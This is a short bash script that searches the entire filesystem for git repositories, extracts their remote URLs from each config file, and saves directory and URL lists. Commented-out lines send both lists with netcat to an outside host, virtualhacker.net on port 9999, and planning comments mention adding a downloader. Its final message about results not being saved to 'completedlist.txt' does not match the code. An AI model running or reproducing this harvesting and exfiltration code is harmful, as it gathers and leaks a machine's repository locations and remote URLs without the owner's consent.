#!/bin/bash
echo Searching for git repositories...
cd=$(pwd)
cd / ; find -name ".git" -type d 2>/dev/null | grep -v dradis | cut -c2- >$cd/gitlist


for url in $(cat $cd/gitlist)
do
cd $url ;  cat config 2>/dev/null | grep "http" | cut -c8- >>$cd/urllist ; cd .. && pwd >>$cd/dirlist 
done
echo Results have not been saved to completedlist.txt

#echo Your directory list is here:
#cat $cd/dirlist | nc virtualhacker.net 9999
#echo Your URLlist is here:
#cat $cd/urllist | nc virtualhacker.net 9999

#[plan]
# Have dirlist read out line by line 
# Have separate file for downloaded locations
# [edit] Cat the files and see if the numbers are even or odd
# Then use even numbers for git link and odd for download locations
# Maybe add a downloader in the future
#
